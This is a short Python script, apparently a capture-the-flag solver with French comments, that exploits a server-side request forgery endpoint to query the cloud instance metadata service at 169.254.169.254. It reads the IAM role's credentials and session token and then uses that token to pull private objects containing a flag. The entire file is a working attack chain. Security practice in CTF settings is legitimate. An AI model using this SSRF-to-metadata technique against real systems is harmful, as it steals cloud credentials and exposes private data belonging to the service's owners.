#!/usr/bin/env python3
"""artifacts-imds & variantes (backup/billing/cdn-imds) : SSRF->IMDS->rôle->objet privé."""
import sys,urllib.parse,urllib.request,json,re
U=sys.argv[1].rstrip('/')
def fetch(url):
    q=U+'/fetch?url='+urllib.parse.quote(url,safe='')
    return urllib.request.urlopen(q,timeout=20).read().decode()
# 1) rôle
meta=fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
role=json.loads(meta)['paths'][0].rsplit('/',1)[-1]
# 2) credential
cred=json.loads(fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/"+role))
tok=cred['Token']; print("[+] role",role,"token",tok[:12]+"...")
# 3) objet privé
for key in ('flag','private/flag','backup/flag'):
    try:
        req=urllib.request.Request(U+'/objects/'+key,headers={'X-Role-Token':tok})
        body=urllib.request.urlopen(req,timeout=15).read().decode()
        m=re.search(r'NCTF\{[^}]+\}',body)
        if m: print("[+] FLAG:",m.group()); break
    except Exception: pass
